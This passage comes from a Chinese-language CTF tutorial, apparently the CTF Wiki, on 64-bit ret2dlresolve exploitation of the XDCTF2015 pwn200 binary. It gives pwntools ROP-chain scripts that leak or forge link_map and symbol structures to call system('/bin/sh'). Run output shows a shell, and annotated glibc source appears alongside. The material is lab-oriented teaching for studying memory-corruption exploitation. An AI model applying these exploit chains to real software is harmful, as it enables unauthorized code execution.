    <span class=n>resolve_call</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>plt0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>reloc_index</span><span class=p>)</span>
    <span class=k>return</span> <span class=n>resolve_data</span><span class=p>,</span> <span class=n>resolve_call</span>


<span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Welcome to XDCTF2015~!</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
<span class=n>gdb</span><span class=o>.</span><span class=n>attach</span><span class=p>(</span><span class=n>io</span><span class=p>)</span>

<span class=n>store_addr</span> <span class=o>=</span> <span class=n>bss_addr</span><span class=o>+</span><span class=mh>0x100</span>
<span class=n>sh</span> <span class=o>=</span> <span class=s2>&quot;/bin/sh</span><span class=se>\x00</span><span class=s2>&quot;</span>

<span class=c1># construct fake string, symbol, reloc.modify .dynstr pointer in .dynamic section to a specific location</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s2>&quot;./main_partial_relro_64&quot;</span><span class=p>)</span>
<span class=n>offset</span> <span class=o>=</span> <span class=mi>112</span><span class=o>+</span><span class=mi>8</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>offset</span><span class=o>*</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
<span class=n>resolve_data</span><span class=p>,</span> <span class=n>resolve_call</span> <span class=o>=</span> <span class=n>ret2dlresolve_x64</span><span class=p>(</span><span class=n>elf</span><span class=p>,</span> <span class=n>store_addr</span><span class=p>,</span> <span class=s2>&quot;system&quot;</span><span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s2>&quot;write&quot;</span><span class=p>])</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>csu</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span> <span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span><span class=mi>0</span><span class=p>,</span><span class=n>store_addr</span><span class=p>,</span><span class=nb>len</span><span class=p>(</span><span class=n>resolve_data</span><span class=p>)</span><span class=o>+</span><span class=nb>len</span><span class=p>(</span><span class=n>sh</span><span class=p>)))</span>  
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>vuln_addr</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s2>&quot;a&quot;</span><span class=o>*</span><span class=p>(</span><span class=mi>256</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=k>assert</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span><span class=o>&lt;=</span><span class=mi>256</span><span class=p>)</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>
<span class=c1># send resolve data</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>resolve_data</span><span class=o>+</span><span class=n>sh</span><span class=p>)</span>
<span class=n>bin_sh_addr</span> <span class=o>=</span> <span class=n>store_addr</span><span class=o>+</span><span class=nb>len</span><span class=p>(</span><span class=n>resolve_data</span><span class=p>)</span>


<span class=c1># rop = ROP(&quot;./main_partial_relro_64&quot;)</span>
<span class=c1># rop.raw(offset*&#39;\x00&#39;)</span>
<span class=c1># sh = &quot;/bin/sh\x00&quot;</span>
<span class=c1># bin_sh_addr = store_addr+len(resolve_data)</span>
<span class=c1># rop.raw(csu(0, 1 ,elf.got[&#39;read&#39;],0,bin_sh_addr,len(sh)))</span>
<span class=c1># rop.raw(vuln_addr)</span>
<span class=c1># rop.raw(&quot;a&quot;*(256-len(rop.chain())))</span>
<span class=c1># io.send(rop.chain())</span>
<span class=c1># io.send(sh)</span>


<span class=c1># leak link_map addr</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s2>&quot;./main_partial_relro_64&quot;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>offset</span><span class=o>*</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>csu</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span> <span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;write&#39;</span><span class=p>],</span><span class=mi>1</span><span class=p>,</span><span class=mh>0x601008</span><span class=p>,</span><span class=mi>8</span><span class=p>))</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>vuln_addr</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=o>*</span><span class=p>(</span><span class=mi>256</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>
<span class=n>link_map_addr</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>8</span><span class=p>))</span>
<span class=nb>print</span><span class=p>(</span><span class=nb>hex</span><span class=p>(</span><span class=n>link_map_addr</span><span class=p>))</span>


<span class=c1># set l-&gt;l_info[VERSYMIDX(DT_VERSYM)] =  NULL</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s2>&quot;./main_partial_relro_64&quot;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>offset</span><span class=o>*</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>csu</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span> <span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span><span class=mi>0</span><span class=p>,</span><span class=n>link_map_addr</span><span class=o>+</span><span class=mh>0x1c8</span><span class=p>,</span><span class=mi>8</span><span class=p>))</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>vuln_addr</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=o>*</span><span class=p>(</span><span class=mi>256</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>))</span>


<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s2>&quot;./main_partial_relro_64&quot;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>offset</span><span class=o>*</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0x00000000004007a3</span><span class=p>)</span> <span class=c1># 0x00000000004007a3: pop rdi; ret; </span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>bin_sh_addr</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>resolve_call</span><span class=p>)</span>
<span class=c1># rop.raw(&#39;\x00&#39;*(256-len(rop.chain())))</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>
<span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</code></pre></div> <p>这时候即可利用成功</p> <div class=highlight><pre><span></span><code>❯ python exp-manual4.py
<span class=o>[</span>+<span class=o>]</span> Starting <span class=nb>local</span> process <span class=s1>&#39;./main_partial_relro_64&#39;</span>: pid <span class=m>47378</span>
<span class=o>[</span>*<span class=o>]</span> <span class=s1>&#39;/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/partial-relro/main_partial_relro_64&#39;</span>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class=o>(</span>0x400000<span class=o>)</span>
<span class=o>[</span>*<span class=o>]</span> running in new terminal: /usr/bin/gdb -q  <span class=s2>&quot;./main_partial_relro_64&quot;</span> <span class=m>47378</span>
<span class=o>[</span>-<span class=o>]</span> Waiting <span class=k>for</span> debugger: debugger exited! <span class=o>(</span>maybe check /proc/sys/kernel/yama/ptrace_scope<span class=o>)</span>
<span class=o>[</span>*<span class=o>]</span> Loaded <span class=m>14</span> cached gadgets <span class=k>for</span> <span class=s1>&#39;./main_partial_relro_64&#39;</span>
0x7f0d01125170
<span class=o>[</span>*<span class=o>]</span> Switching to interactive mode
$ whoami
iromise
</code></pre></div> <h5 id=second-try-no-leak>Second try - no leak<a class=headerlink href=#second-try-no-leak title="Permanent link">&para;</a></h5> <p>可以看出，在上面的测试中，我们仍然利用 write 函数泄露了 link_map 的地址，那么，如果程序中没有输出函数，我们是否还能够发起利用呢？答案是可以的。我们再来看一下 <code>_dl_fix_up</code> 的实现</p> <div class=highlight><pre><span></span><code>    <span class=cm>/* Look up the target symbol.  If the normal lookup rules are not</span>
<span class=cm>      used don&#39;t look in the global scope.  */</span>
    <span class=c1>// 判断符号的可见性</span>
    <span class=k>if</span> <span class=p>(</span><span class=n>__builtin_expect</span><span class=p>(</span><span class=n>ELFW</span><span class=p>(</span><span class=n>ST_VISIBILITY</span><span class=p>)(</span><span class=n>sym</span><span class=o>-&gt;</span><span class=n>st_other</span><span class=p>),</span> <span class=mi>0</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span>
    <span class=p>{</span>
        <span class=c1>// 获取符号的版本信息</span>
        <span class=k>const</span> <span class=k>struct</span> <span class=nc>r_found_version</span> <span class=o>*</span><span class=n>version</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
        <span class=k>if</span> <span class=p>(</span><span class=n>l</span><span class=o>-&gt;</span><span class=n>l_info</span><span class=p>[</span><span class=n>VERSYMIDX</span><span class=p>(</span><span class=n>DT_VERSYM</span><span class=p>)]</span> <span class=o>!=</span> <span class=nb>NULL</span><span class=p>)</span>
        <span class=p>{</span>
            <span class=k>const</span> <span class=nf>ElfW</span><span class=p>(</span><span class=n>Half</span><span class=p>)</span> <span class=o>*</span><span class=n>vernum</span> <span class=o>=</span> <span class=p>(</span><span class=k>const</span> <span class=kt>void</span> <span class=o>*</span><span class=p>)</span><span class=n>D_PTR</span><span class=p>(</span><span class=n>l</span><span class=p>,</span> <span class=n>l_info</span><span class=p>[</span><span class=n>VERSYMIDX</span><span class=p>(</span><span class=n>DT_VERSYM</span><span class=p>)]);</span>
            <span class=n>ElfW</span><span class=p>(</span><span class=n>Half</span><span class=p>)</span> <span class=n>ndx</span> <span class=o>=</span> <span class=n>vernum</span><span class=p>[</span><span class=n>ELFW</span><span class=p>(</span><span class=n>R_SYM</span><span class=p>)(</span><span class=n>reloc</span><span class=o>-&gt;</span><span class=n>r_info</span><span class=p>)]</span> <span class=o>&amp;</span> <span class=mh>0x7fff</span><span class=p>;</span>
            <span class=n>version</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>l</span><span class=o>-&gt;</span><span class=n>l_versions</span><span class=p>[</span><span class=n>ndx</span><span class=p>];</span>
            <span class=k>if</span> <span class=p>(</span><span class=n>version</span><span class=o>-&gt;</span><span class=n>hash</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span>
                <span class=n>version</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
        <span class=p>}</span>
        <span class=cm>/* We need to keep the scope around so do some locking.  This is</span>
<span class=cm>         not necessary for objects which cannot be unloaded or when</span>
<span class=cm>         we are not using any threads (yet).  */</span>
        <span class=kt>int</span> <span class=n>flags</span> <span class=o>=</span> <span class=n>DL_LOOKUP_ADD_DEPENDENCY</span><span class=p>;</span>
        <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>RTLD_SINGLE_THREAD_P</span><span class=p>)</span>
        <span class=p>{</span>
            <span class=n>THREAD_GSCOPE_SET_FLAG</span><span class=p>();</span>
            <span class=n>flags</span> <span class=o>|=</span> <span class=n>DL_LOOKUP_GSCOPE_LOCK</span><span class=p>;</span>
        <span class=p>}</span>
<span class=cp>#ifdef RTLD_ENABLE_FOREIGN_CALL</span>
        <span class=n>RTLD_ENABLE_FOREIGN_CALL</span><span class=p>;</span>
<span class=cp>#endif</span>
        <span class=c1>// 查询待解析符号所在的目标文件的 link_map</span>
        <span class=n>result</span> <span class=o>=</span> <span class=n>_dl_lookup_symbol_x</span><span class=p>(</span><span class=n>strtab</span> <span class=o>+</span> <span class=n>sym</span><span class=o>-&gt;</span><span class=n>st_name</span><span class=p>,</span> <span class=n>l</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>sym</span><span class=p>,</span> <span class=n>l</span><span class=o>-&gt;</span><span class=n>l_scope</span><span class=p>,</span>
                                     <span class=n>version</span><span class=p>,</span> <span class=n>ELF_RTYPE_CLASS_PLT</span><span class=p>,</span> <span class=n>flags</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
        <span class=cm>/* We are done with the global scope.  */</span>
        <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>RTLD_SINGLE_THREAD_P</span><span class=p>)</span>
            <span class=n>THREAD_GSCOPE_RESET_FLAG</span><span class=p>();</span>
<span class=cp>#ifdef RTLD_FINALIZE_FOREIGN_CALL</span>
        <span class=n>RTLD_FINALIZE_FOREIGN_CALL</span><span class=p>;</span>
<span class=cp>#endif</span>
        <span class=cm>/* Currently result contains the base load address (or link map)</span>
<span class=cm>         of the object that defines sym.  Now add in the symbol</span>
<span class=cm>         offset.  */</span>
        <span class=c1>// 基于查询到的 link_map 计算符号的绝对地址: result-&gt;l_addr + sym-&gt;st_value</span>
        <span class=c1>// l_addr 为待解析函数所在文件的基地址</span>
        <span class=n>value</span> <span class=o>=</span> <span class=n>DL_FIXUP_MAKE_VALUE</span><span class=p>(</span><span class=n>result</span><span class=p>,</span>
                                    <span class=n>SYMBOL_ADDRESS</span><span class=p>(</span><span class=n>result</span><span class=p>,</span> <span class=n>sym</span><span class=p>,</span> <span class=nb>false</span><span class=p>));</span>
    <span class=p>}</span>
    <span class=k>else</span>
    <span class=p>{</span>
        <span class=cm>/* We already found the symbol.  The module (and therefore its load</span>
<span class=cm>         address) is also known.  */</span>
        <span class=n>value</span> <span class=o>=</span> <span class=n>DL_FIXUP_MAKE_VALUE</span><span class=p>(</span><span class=n>l</span><span class=p>,</span> <span class=n>SYMBOL_ADDRESS</span><span class=p>(</span><span class=n>l</span><span class=p>,</span> <span class=n>sym</span><span class=p>,</span> <span class=nb>true</span><span class=p>));</span>
        <span class=n>result</span> <span class=o>=</span> <span class=n>l</span><span class=p>;</span>
    <span class=p>}</span>
</code></pre></div> <p>如果我们故意将 __builtin_expect(ELFW(ST_VISIBILITY)(sym-&gt;st_other), 0) 设置为 0，那么程序就会执行 else 分支。具体的，我们设置 sym-&gt;st_other 不为 0 即可满足这一条件。</p> <div class=highlight><pre><span></span><code><span class=cm>/* How to extract and insert information held in the st_other field.  */</span>
<span class=cp>#define ELF32_ST_VISIBILITY(o)        ((o) &amp; 0x03)</span>
<span class=cm>/* For ELF64 the definitions are the same.  */</span>
<span class=cp>#define ELF64_ST_VISIBILITY(o)        ELF32_ST_VISIBILITY (o)</span>
<span class=cm>/* Symbol visibility specification encoded in the st_other field.  */</span>
<span class=cp>#define STV_DEFAULT        0                </span><span class=cm>/* Default symbol visibility rules */</span><span class=cp></span>
<span class=cp>#define STV_INTERNAL        1                </span><span class=cm>/* Processor specific hidden class */</span><span class=cp></span>
<span class=cp>#define STV_HIDDEN        2                </span><span class=cm>/* Sym unavailable in other modules */</span><span class=cp></span>
<span class=cp>#define STV_PROTECTED        3                </span><span class=cm>/* Not preemptible, not exported */</span><span class=cp></span>
</code></pre></div> <p>此时程序计算 value 的方式为</p> <div class=highlight><pre><span></span><code>value = l-&gt;l_addr + sym-&gt;st_value
</code></pre></div> <p>通过查看 link_map 结构体的<a href=https://code.woboq.org/userspace/glibc/include/link.h.html#link_map>定义</a>，可以知道 l_addr 是 link_map 的第一个成员，那么如果我们伪造上述这两个变量，并借助于已有的被解析的函数地址，比如</p> <ul> <li>伪造 link_map-&gt;l_addr 为已解析函数与想要执行的目标函数的偏移值，如 addr_system-addr_xxx </li> <li>伪造 sym-&gt;st_value 为已经解析过的某个函数的 got 表的位置，即相当于有了一个隐式的信息泄露</li> </ul> <p>那就可以得到对应的目标地址。</p> <div class=highlight><pre><span></span><code><span class=k>struct</span> <span class=nc>link_map</span>
  <span class=p>{</span>
    <span class=cm>/* These first few members are part of the protocol with the debugger.</span>
<span class=cm>       This is the same format used in SVR4.  */</span>
    <span class=n>ElfW</span><span class=p>(</span><span class=n>Addr</span><span class=p>)</span> <span class=n>l_addr</span><span class=p>;</span>                <span class=cm>/* Difference between the address in the ELF</span>
<span class=cm>                                   file and the addresses in memory.  */</span>
    <span class=kt>char</span> <span class=o>*</span><span class=n>l_name</span><span class=p>;</span>                <span class=cm>/* Absolute file name object was found in.  */</span>
    <span class=n>ElfW</span><span class=p>(</span><span class=n>Dyn</span><span class=p>)</span> <span class=o>*</span><span class=n>l_ld</span><span class=p>;</span>                <span class=cm>/* Dynamic section of the shared object.  */</span>
    <span class=k>struct</span> <span class=nc>link_map</span> <span class=o>*</span><span class=n>l_next</span><span class=p>,</span> <span class=o>*</span><span class=n>l_prev</span><span class=p>;</span> <span class=cm>/* Chain of loaded objects.  */</span>
    <span class=cm>/* All following members are internal to the dynamic linker.</span>
<span class=cm>       They may change without notice.  */</span>
    <span class=cm>/* This is an element which is only ever different from a pointer to</span>
<span class=cm>       the very same copy of this type for ld.so when it is used in more</span>
<span class=cm>       than one namespace.  */</span>
    <span class=k>struct</span> <span class=nc>link_map</span> <span class=o>*</span><span class=n>l_real</span><span class=p>;</span>
    <span class=cm>/* Number of the namespace this link map belongs to.  */</span>
    <span class=n>Lmid_t</span> <span class=n>l_ns</span><span class=p>;</span>
    <span class=k>struct</span> <span class=nc>libname_list</span> <span class=o>*</span><span class=n>l_libname</span><span class=p>;</span>
    <span class=cm>/* Indexed pointers to dynamic section.</span>
<span class=cm>       [0,DT_NUM) are indexed by the processor-independent tags.</span>
<span class=cm>       [DT_NUM,DT_NUM+DT_THISPROCNUM) are indexed by the tag minus DT_LOPROC.</span>
<span class=cm>       [DT_NUM+DT_THISPROCNUM,DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM) are</span>
<span class=cm>       indexed by DT_VERSIONTAGIDX(tagvalue).</span>
<span class=cm>       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM,</span>
<span class=cm>        DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM) are indexed by</span>
<span class=cm>       DT_EXTRATAGIDX(tagvalue).</span>
<span class=cm>       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM,</span>
<span class=cm>        DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM) are</span>
<span class=cm>       indexed by DT_VALTAGIDX(tagvalue) and</span>
<span class=cm>       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM,</span>
<span class=cm>        DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM+DT_ADDRNUM)</span>
<span class=cm>       are indexed by DT_ADDRTAGIDX(tagvalue), see &lt;elf.h&gt;.  */</span>
    <span class=n>ElfW</span><span class=p>(</span><span class=n>Dyn</span><span class=p>)</span> <span class=o>*</span><span class=n>l_info</span><span class=p>[</span><span class=n>DT_NUM</span> <span class=o>+</span> <span class=n>DT_THISPROCNUM</span> <span class=o>+</span> <span class=n>DT_VERSIONTAGNUM</span>
                      <span class=o>+</span> <span class=n>DT_EXTRANUM</span> <span class=o>+</span> <span class=n>DT_VALNUM</span> <span class=o>+</span> <span class=n>DT_ADDRNUM</span><span class=p>];</span>
</code></pre></div> <p>一般而言，至少有 __libc_start_main 已经解析过了。本例中，显然不止这一个函数。</p> <div class=highlight><pre><span></span><code>.got:0000000000600FF0 ; ===========================================================================
.got:0000000000600FF0
.got:0000000000600FF0 ; Segment type: Pure data
.got:0000000000600FF0 ; Segment permissions: Read/Write
.got:0000000000600FF0 ; Segment alignment &#39;qword&#39; can not be represented in assembly
.got:0000000000600FF0 _got            segment para public &#39;DATA&#39; use64
.got:0000000000600FF0                 assume cs:_got
.got:0000000000600FF0                 ;org 600FF0h
.got:0000000000600FF0 __libc_start_main_ptr dq offset __libc_start_main
.got:0000000000600FF0                                         ; DATA XREF: _start+24↑r
.got:0000000000600FF8 __gmon_start___ptr dq offset __gmon_start__
.got:0000000000600FF8                                         ; DATA XREF: _init_proc+4↑r
.got:0000000000600FF8 _got            ends
.got:0000000000600FF8
.got.plt:0000000000601000 ; ===========================================================================
.got.plt:0000000000601000
.got.plt:0000000000601000 ; Segment type: Pure data
.got.plt:0000000000601000 ; Segment permissions: Read/Write
.got.plt:0000000000601000 ; Segment alignment &#39;qword&#39; can not be represented in assembly
.got.plt:0000000000601000 _got_plt        segment para public &#39;DATA&#39; use64
.got.plt:0000000000601000                 assume cs:_got_plt
.got.plt:0000000000601000                 ;org 601000h
.got.plt:0000000000601000 _GLOBAL_OFFSET_TABLE_ dq offset _DYNAMIC
.got.plt:0000000000601008 qword_601008    dq 0                    ; DATA XREF: sub_400500↑r
.got.plt:0000000000601010 qword_601010    dq 0                    ; DATA XREF: sub_400500+6↑r
.got.plt:0000000000601018 off_601018      dq offset write         ; DATA XREF: _write↑r
.got.plt:0000000000601020 off_601020      dq offset strlen        ; DATA XREF: _strlen↑r
.got.plt:0000000000601028 off_601028      dq offset setbuf        ; DATA XREF: _setbuf↑r
.got.plt:0000000000601030 off_601030      dq offset read          ; DATA XREF: _read↑r
.got.plt:0000000000601030 _got_plt        ends
.got.plt:0000000000601030
</code></pre></div> <p>与此同时，通过阅读 <code>_dl_fixup</code> 函数的代码，在设置 <code>__builtin_expect(ELFW(ST_VISIBILITY)(sym-&gt;st_other), 0)</code> 为 0 后，我们可以发现，该函数主要依赖了 link_map 中 l_info 的内容。因此，我们同样需要伪造该部分所需要的内容。</p> <p>利用代码如下</p> <div class=highlight><pre><span></span><code><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
<span class=c1># context.log_level=&quot;debug&quot;</span>
<span class=n>context</span><span class=o>.</span><span class=n>terminal</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&quot;tmux&quot;</span><span class=p>,</span><span class=s2>&quot;splitw&quot;</span><span class=p>,</span><span class=s2>&quot;-h&quot;</span><span class=p>]</span>
<span class=n>context</span><span class=o>.</span><span class=n>arch</span> <span class=o>=</span> <span class=s2>&quot;amd64&quot;</span>
<span class=n>io</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s2>&quot;./main_partial_relro_64&quot;</span><span class=p>)</span>
<span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&quot;./main_partial_relro_64&quot;</span><span class=p>)</span>

<span class=n>bss_addr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>bss</span><span class=p>()</span>
<span class=n>csu_front_addr</span> <span class=o>=</span> <span class=mh>0x400780</span>
<span class=n>csu_end_addr</span> <span class=o>=</span> <span class=mh>0x40079A</span>
<span class=n>vuln_addr</span> <span class=o>=</span> <span class=mh>0x400637</span>


<span class=k>def</span> <span class=nf>csu</span><span class=p>(</span><span class=n>rbx</span><span class=p>,</span> <span class=n>rbp</span><span class=p>,</span> <span class=n>r12</span><span class=p>,</span> <span class=n>r13</span><span class=p>,</span> <span class=n>r14</span><span class=p>,</span> <span class=n>r15</span><span class=p>):</span>
    <span class=c1># pop rbx, rbp, r12, r13, r14, r15</span>
    <span class=c1># rbx = 0</span>
    <span class=c1># rbp = 1, enable not to jump</span>
    <span class=c1># r12 should be the function that you want to call</span>
    <span class=c1># rdi = edi = r13d</span>
    <span class=c1># rsi = r14</span>
    <span class=c1># rdx = r15</span>
    <span class=n>payload</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>csu_end_addr</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>rbx</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>rbp</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r12</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r13</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r14</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r15</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>csu_front_addr</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span> <span class=o>*</span> <span class=mh>0x38</span>
    <span class=k>return</span> <span class=n>payload</span>


<span class=k>def</span> <span class=nf>ret2dlresolve_with_fakelinkmap_x64</span><span class=p>(</span><span class=n>elf</span><span class=p>,</span> <span class=n>fake_linkmap_addr</span><span class=p>,</span> <span class=n>known_function_ptr</span><span class=p>,</span> <span class=n>offset_of_two_addr</span><span class=p>):</span>
    <span class=sd>&#39;&#39;&#39;</span>
<span class=sd>    elf: is the ELF object</span>

<span class=sd>    fake_linkmap_addr: the address of the fake linkmap</span>

<span class=sd>    known_function_ptr: a already known pointer of the function, e.g., elf.got[&#39;__libc_start_main&#39;]</span>

<span class=sd>    offset_of_two_addr: target_function_addr - *(known_function_ptr), where</span>
<span class=sd>                        target_function_addr is the function you want to execute</span>

<span class=sd>    WARNING: assert *(known_function_ptr-8) &amp; 0x0000030000000000 != 0 as ELF64_ST_VISIBILITY(o) = o &amp; 0x3</span>

<span class=sd>    WARNING: be careful that fake_linkmap is 0x100 bytes length   </span>

<span class=sd>    we will do _dl_runtime_resolve(linkmap,reloc_arg) where reloc_arg=0</span>

<span class=sd>    linkmap:</span>
<span class=sd>        0x00: l_addr = offset_of_two_addr</span>
<span class=sd>      fake_DT_JMPREL entry, addr = fake_linkmap_addr + 0x8</span>
<span class=sd>        0x08: 17, tag of the JMPREL</span>
<span class=sd>        0x10: fake_linkmap_addr + 0x18, pointer of the fake JMPREL</span>
<span class=sd>      fake_JMPREL, addr = fake_linkmap_addr + 0x18</span>
<span class=sd>        0x18: p_r_offset, offset pointer to the resloved addr</span>
<span class=sd>        0x20: r_info</span>
<span class=sd>        0x28: append</span>
<span class=sd>      resolved addr</span>
<span class=sd>        0x30: r_offset</span>
<span class=sd>      fake_DT_SYMTAB, addr = fake_linkmap_addr + 0x38</span>
<span class=sd>        0x38: 6, tag of the DT_SYMTAB</span>
<span class=sd>        0x40: known_function_ptr-8, p_fake_symbol_table</span>
<span class=sd>      command that you want to execute for system</span>
<span class=sd>        0x48: /bin/sh</span>
<span class=sd>      P_DT_STRTAB, pointer for DT_STRTAB</span>
<span class=sd>        0x68: fake a pointer, e.g., fake_linkmap_addr</span>
<span class=sd>      p_DT_SYMTAB, pointer for fake_DT_SYMTAB</span>
<span class=sd>        0x70: fake_linkmap_addr + 0x38</span>
<span class=sd>      p_DT_JMPREL, pointer for fake_DT_JMPREL</span>
<span class=sd>        0xf8: fake_linkmap_addr + 0x8</span>
<span class=sd>    &#39;&#39;&#39;</span>
    <span class=n>plt0</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.plt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>

    <span class=n>linkmap</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>offset_of_two_addr</span> <span class=o>&amp;</span> <span class=p>(</span><span class=mi>2</span><span class=o>**</span><span class=mi>64</span> <span class=o>-</span> <span class=mi>1</span><span class=p>))</span>
